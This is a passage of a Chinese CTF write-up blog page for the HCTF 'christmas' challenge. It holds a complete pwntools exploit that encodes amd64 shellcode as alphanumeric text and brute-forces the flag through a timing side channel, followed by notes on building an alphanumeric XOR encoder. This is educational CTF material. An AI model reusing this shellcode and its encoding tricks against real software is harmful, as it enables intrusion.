class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import pwnlib.shellcraft.amd64 as sc</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">playload = asm(sc.mov(&apos;rax&apos;,0x602030))+\</span><br><span class="line">asm(&apos;mov rbx,[rax]&apos;)+\</span><br><span class="line">asm(sc.mov(&apos;rcx&apos;,0x6f690))+\</span><br><span class="line">asm(&apos;sub rbx,rcx&apos;)+\</span><br><span class="line">asm(sc.push(0x6FFFFEF5))+\</span><br><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    start :</span><br><span class="line">        push 4</span><br><span class="line">        pop rcx</span><br><span class="line">        mov rdi,rbx</span><br><span class="line">        mov rsi,rsp</span><br><span class="line">        cld</span><br><span class="line">        repe cmpsb</span><br><span class="line">        jz do</span><br><span class="line">        sub rbx,1</span><br><span class="line">        jnz start</span><br><span class="line">    do :</span><br><span class="line">        add rbx,0x18</span><br><span class="line">        mov r10,[rbx]</span><br><span class="line">        add rbx,0x10</span><br><span class="line">        mov r11,[rbx]</span><br><span class="line">        sub rdi,0x1c</span><br><span class="line">        mov rcx,[rdi]</span><br><span class="line">        sub rbx,0x78</span><br><span class="line">        sub rbx,0x30</span><br><span class="line">        sub rbx,rcx</span><br><span class="line">        mov r12,rbx</span><br><span class="line">    &apos;&apos;&apos;)+\</span><br><span class="line">asm(&apos;mov rbx,r10&apos;)+\</span><br><span class="line">asm(sc.pushstr(&apos;flag_yes_&apos;))+\</span><br><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    start :</span><br><span class="line">        push 9</span><br><span class="line">        pop rcx</span><br><span class="line">        mov rdi,rbx</span><br><span class="line">        mov rsi,rsp</span><br><span class="line">        cld</span><br><span class="line">        repe cmpsb</span><br><span class="line">        jz do</span><br><span class="line">        add rbx,1</span><br><span class="line">        jnz start</span><br><span class="line">    do :</span><br><span class="line">        sub rbx,r10</span><br><span class="line">    &apos;&apos;&apos;)+\</span><br><span class="line">asm(&apos;mov rax,rbx&apos;)+\</span><br><span class="line">asm(&apos;mov rbx,r11&apos;)+\</span><br><span class="line">asm(&apos;push rax&apos;)+\</span><br><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    start :</span><br><span class="line">        push 3</span><br><span class="line">        pop rcx</span><br><span class="line">        mov rdi,rbx</span><br><span class="line">        mov rsi,rsp</span><br><span class="line">        cld</span><br><span class="line">        repe cmpsb</span><br><span class="line">        jz do</span><br><span class="line">        add rbx,1</span><br><span class="line">        jnz start</span><br><span class="line">    do :</span><br><span class="line">    &apos;&apos;&apos;)+\</span><br><span class="line">asm(&apos;mov rax,rbx&apos;)+\</span><br><span class="line">asm(&apos;add rax,0x8&apos;)+\</span><br><span class="line">asm(&apos;mov rbx,[rax]&apos;)+\</span><br><span class="line">asm(&apos;add rbx,r12&apos;)+\</span><br><span class="line">asm(&apos;call rbx&apos;)</span><br><span class="line"></span><br><span class="line">def addplayload(index,asc) :</span><br><span class="line">    tmp = playload+asm(&apos;&apos;&apos;</span><br><span class="line">                        add al,%d</span><br><span class="line">                        xor rbx,rbx</span><br><span class="line">                        xor rcx,rcx</span><br><span class="line">                        mov bl,[rax]</span><br><span class="line">                        add cl,%d</span><br><span class="line">                        cmp bl,cl</span><br><span class="line">                        jz do</span><br><span class="line">                        xor rax,rax</span><br><span class="line">                        mov al,60</span><br><span class="line">                        syscall</span><br><span class="line">                    do :</span><br><span class="line">                    &apos;&apos;&apos;%(index,asc))+asm(sc.infloop())</span><br><span class="line">    #mov al,%d;add al,%d</span><br><span class="line">    f = open(&apos;shell&apos;,&apos;wb&apos;)</span><br><span class="line">    f.write(tmp)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">def encode(index,asc) :</span><br><span class="line">    addplayload(index,asc)</span><br><span class="line">    a = os.popen(&quot;python ~/alpha3/ALPHA3.py x64 ascii mixedcase RAX --input=&apos;shell&apos;&quot;)</span><br><span class="line">    payload = &apos;42&apos;   #replace base addr</span><br><span class="line">    payload += a.read()</span><br><span class="line">    a.close()</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">def exp(index,asc) :</span><br><span class="line">    p = process(&apos;./christmas&apos;)</span><br><span class="line">    payload = encode(index,asc)</span><br><span class="line">    p.recvuntil(&apos;tell me how to find it??\n&apos;)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    start = time.time()</span><br><span class="line">    p.can_recv(timeout=3)</span><br><span class="line">    end = time.time()</span><br><span class="line">    p.close()</span><br><span class="line">    if end - start &gt; 2 :</span><br><span class="line">        #print asc</span><br><span class="line">        return True</span><br><span class="line">    else :</span><br><span class="line">        #p.close()</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def start() :</span><br><span class="line">    scaii = &apos;&#123;&#125;_+=-~?&quot;;:1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">    flag = &apos;HCTF&#123;&apos;</span><br><span class="line">    for i in range(5,40) :</span><br><span class="line">        for j in scaii :</span><br><span class="line">            try :</span><br><span class="line">                print &apos;(%d,%d)&apos;%(i,ord(j))</span><br><span class="line">                if exp(i,ord(j)) :</span><br><span class="line">                    print j</span><br><span class="line">                    flag += j</span><br><span class="line">                    print flag</span><br><span class="line">                    #raw_input(&apos;&apos;)</span><br><span class="line">                    if j == &apos;&#125;&apos; :</span><br><span class="line">                        print flag</span><br><span class="line">                        exit()</span><br><span class="line">            except Exception as e :</span><br><span class="line">                print e</span><br><span class="line"></span><br><span class="line">if __name__ ==  &apos;__main__&apos; :</span><br><span class="line">    start()</span><br></pre></td></tr></table></figure>
+<h2 id="待填坑："><a href="#待填坑：" class="headerlink" title="待填坑："></a>待填坑：</h2><p>找lib另一种方法：</p>
+<p>因为程序没有pie，我们可以在got等地方get libc的地址，通过偏移算出libc_dlsym，然后调用这个函数解析flag_yes_1337所在位置。</p>
+<p>编写<code>encoder</code>加密：</p>
+<p>encode无非是xor，或一层，直接用解密真实shellcode；或两层，先解密一个精致的encoder，这个encoder再去解密真实的shellcode。</p>
+<p>我采用了一层的做法，这样做的缺点就是encode后shellcode长度会膨胀很厉害。</p>
+<p>如何xor指定offset的一个byte？？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor [rax+rdi],dl</span><br><span class="line">xor [rax+rdi],dh</span><br><span class="line">xor [rax+rdi+0x32],dl</span><br><span class="line">xor [rax+rdi+0x32],dh</span><br></pre></td></tr></table></figure>
+<p>这些都是比较好的gadget。那问题就到了如何设置rdi上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push XXX</span><br><span class="line">push rsp</span><br><span class="line">pop rcx</span><br><span class="line">imul edi,[rcx],YYY</span><br></pre></td></tr></table></figure>
+<p>因为imul的对象是edi，因此可以将最高位溢出，得到一个几乎任意的edi值，但是XXX和YYY除都必须是alphanumeric，这个问题不大，我做了打表处理。</p>
+<p>举个例子，我们要xor idx为80处的byte，可以通过一下代码实现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 1431655766</span><br><span class="line">push rsp</span><br><span class="line">pop rcx</span><br><span class="line">imul edi,[rcx],48</span><br><span class="line">xor [rax+rdi+48],dl</span><br></pre></td></tr></table></figure>
+<p>idx的问题解决了，就是怎么合理设置dl或dh的值让所有byte xor或不xor后，结果都落在alphanumeric范围中。</p>
+<p>我用脚本跑了一下，[0x80,0xff] 的字符最少需要4个不同的值才能全部xor到alphanumeric，而[0x00,0x7f]只需要3个不同的值。</p>
+<p>比如我们取 0x30，0x59，0x55来xor [0x00,0x7f] ，取0x80，0xc0，0x88，0xc8来xor [0x80,0xff]，分别放到dh和dl，就有了下面4个int，这几个值都能通过上面设置idx的方法得到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r8  : 0x3080</span><br><span class="line">r9  : 0x59c0</span><br><span class="line">r10 : 0x5988</span><br><span class="line">rdx : 0x55c8</span><br></pre></td></tr></table></figure>
+<p>这样无论遇到什么byte，我们都能通过这个方法xor了 。</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/3253#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-4</a></p>
+<p><a href="https://xz.aliyun.com/t/3255#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/3255#toc-16</a></p>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/02/27/IO_FILE/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2098/03/09/V1NKe's Diary/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
